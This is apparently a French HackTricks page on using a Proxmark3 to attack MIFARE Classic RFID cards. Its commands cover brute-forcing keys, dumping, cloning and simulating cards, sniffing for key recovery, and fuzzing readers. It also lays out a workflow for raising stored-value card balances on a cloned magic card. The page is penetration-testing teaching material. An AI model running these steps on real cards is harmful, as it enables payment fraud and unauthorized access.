# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Attaquer les systèmes RFID avec Proxmark3

La première chose à faire est de posséder un [**Proxmark3**](https://proxmark.com) et de [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Attaque de MIFARE Classic 1KB

Il contient **16 secteurs**, chacun ayant **4 blocs** et chaque bloc contient **16B**. L'UID est dans le secteur 0 bloc 0 (et ne peut pas être modifié).\
Pour accéder à chaque secteur, vous avez besoin de **2 clés** (**A** et **B**) qui sont stockées dans **le bloc 3 de chaque secteur** (sector trailer). Le sector trailer stocke également les **access bits** qui définissent les permissions de **lecture et d'écriture** sur **chaque bloc** en fonction des 2 clés.\
Avoir 2 clés permet, par exemple, d'accorder la permission de lecture si vous connaissez la première et d'écriture si vous connaissez la deuxième.

Plusieurs attaques peuvent être effectuées
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Le Proxmark3 permet d'effectuer d'autres actions comme **eavesdropping** d'une **Tag to Reader communication** pour tenter de trouver des données sensibles. Sur cette carte, vous pouvez simplement sniff la communication et calculer la clé utilisée parce que les **opérations cryptographiques utilisées sont faibles** et qu'en connaissant le texte en clair et le texte chiffré vous pouvez la calculer (`mfkey64` tool).

#### MiFare Classic flux de travail rapide pour l'abus de cartes à valeur stockée

Lorsque les terminaux stockent des soldes sur des Classic cards, un flux de bout en bout typique est :
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Notes

- `hf mf autopwn` orchestre des attaques de type nested/darkside/HardNested, récupère des clés et crée des dumps dans le dossier client dumps.
- `Writing block 0/UID` ne fonctionne que sur les cartes magic gen1a/gen2. Les cartes Classic normales ont un UID en lecture seule.
- De nombreux déploiements utilisent des Classic "value blocks" ou des checksums simples. Assurez-vous que tous les champs dupliqués/complémentés et les checksums sont cohérents après modification.

Voir une méthodologie de niveau supérieur et des mesures d'atténuation dans :

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Commandes brutes

Les systèmes IoT utilisent parfois des **tags non brandés ou non commerciaux**. Dans ce cas, vous pouvez utiliser Proxmark3 pour envoyer des **commandes brutes personnalisées aux tags**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Avec ces informations, vous pouvez essayer de rechercher des informations sur la carte et sur la manière de communiquer avec elle. Proxmark3 permet d'envoyer des commandes raw comme : `hf 14a raw -p -b 7 26`

### Scripts

Le logiciel Proxmark3 est livré avec une liste préchargée de **scripts d'automatisation** que vous pouvez utiliser pour effectuer des tâches simples. Pour récupérer la liste complète, utilisez la commande `script list`. Ensuite, utilisez la commande `script run`, suivie du nom du script :
```
proxmark3> script run mfkeys
```
Vous pouvez créer un script pour **fuzz tag readers**, donc en copiant les données d'une **valid card** il suffit d'écrire un **Lua script** qui **randomize** un ou plusieurs **bytes** aléatoires et vérifier si le **reader crashes** lors d'une itération.

## Références

- [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
